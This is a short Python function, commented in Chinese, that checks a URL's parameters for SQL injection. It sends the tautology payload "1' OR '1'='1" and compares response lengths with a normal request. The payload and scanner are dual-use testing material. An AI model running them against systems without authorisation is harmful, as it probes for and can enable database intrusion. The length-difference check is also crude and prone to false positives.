import requests

def scan_sql_injection(url, params=None):
    """
    對 URL 的每個參數做簡單比對：
    正常回應 vs 注入後回應長度差異 → 可能存在 SQLi
    """
    if params is None:
        params = ['id']   # 預設測試參數
    findings = {}
    for p in params:
        # 1. 正常值
        r1 = requests.get(url, params={p: '1'}, timeout=5)
        # 2. 注入 payload
        payload = "1' OR '1'='1"
        r2 = requests.get(url, params={p: payload}, timeout=5)
        findings[p] = {
            'normal_length': len(r1.text),
            'injected_length': len(r2.text),
            'possible_sqli': len(r1.text) != len(r2.text)
        }
    return findings
